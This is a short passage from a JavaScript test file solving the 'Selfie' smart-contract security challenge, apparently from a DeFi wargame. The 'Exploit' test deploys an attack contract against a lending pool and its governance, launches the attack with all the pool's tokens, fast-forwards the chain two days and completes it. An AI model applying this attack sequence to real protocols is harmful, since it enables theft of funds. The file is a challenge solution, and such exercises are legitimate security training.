...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
     ...
     * execute the actions
     */
    const HackSelfieFactory = await ethers.getContractFactory(
      "HackSelfie",
      deployer
    );

    const HackSelfie = await HackSelfieFactory.deploy(
      this.pool.address,
      this.governance.address
    );

    await HackSelfie.connect(attacker).startSelfieHack(TOKENS_IN_POOL);

    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

    await HackSelfie.connect(attacker).endSelfieHack();
  });
